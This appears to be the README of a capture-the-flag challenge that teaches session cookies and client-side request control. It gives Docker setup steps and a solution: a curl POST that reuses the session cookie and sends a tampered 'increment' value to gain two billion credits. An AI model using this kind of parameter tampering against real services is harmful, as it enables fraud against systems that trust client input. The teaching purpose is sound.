# POST modification
The objective of this is to help the user understand session cookies, as well as help them understand how to control client side requests. 

## Challenge flavor
Try testing out this new credit system that I just created! 

		http://<address>

hint: Credit generation is rate limited. It is literally impossible to generate 2,000,000,000 credits within the CTF timeframe.

## Setup
Build and run docker container

        sudo docker build -t credits .

		sudo docker run credits

## Solution
After logging in, make note of the user_sid cookie. Instead of bruteforcing the credit generation, simply send a POST request with a modified "increment" value as such:

curl -d "increment=2000000000" -b user_sid="<get_user_sid_cookie_from_browser>" -H "Content-Type: application/x-www-form-urlencoded" -X POST http://<website_address>/newcredit
